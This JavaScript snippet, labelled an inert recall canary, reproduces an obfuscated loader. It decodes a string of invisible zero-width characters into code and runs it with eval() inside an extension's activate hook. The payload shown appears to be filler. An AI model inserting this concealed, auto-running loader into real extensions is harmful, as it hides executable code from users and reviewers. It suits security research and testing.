// INERT RECALL CANARY reconstructed from a public write-up. Hosts are .invalid / TEST-NET;
// payloads are console.log strings. Never published, never executed.
const s = '​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌​‌';

const d = [...s].map(c => c === '​' ? '0' : '1').join('').match(/.{8}/g).map(b => String.fromCharCode(parseInt(b, 2))).join('');
exports.activate = function () { eval(d); };
